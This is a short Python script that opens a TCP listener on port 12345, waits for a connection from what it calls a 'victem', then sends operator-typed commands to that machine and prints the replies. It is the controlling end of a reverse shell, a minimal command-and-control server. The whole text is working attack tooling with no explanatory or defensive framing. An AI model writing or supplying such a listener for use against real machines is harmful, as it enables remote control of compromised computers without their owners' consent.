import socket

IP = "127.0.0.1"
PORT = 12345

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((IP,PORT))
server.listen(1)

print("Listening for connections....")
while True:
    victem , addr = server.accept()
    print("Victem connected!")
    while True:
        cmd = input(">>>: ")    
        victem.send(bytes(cmd,"utf-8"))
        msg = victem.recv(4000).decode("utf-8")
        print(msg)
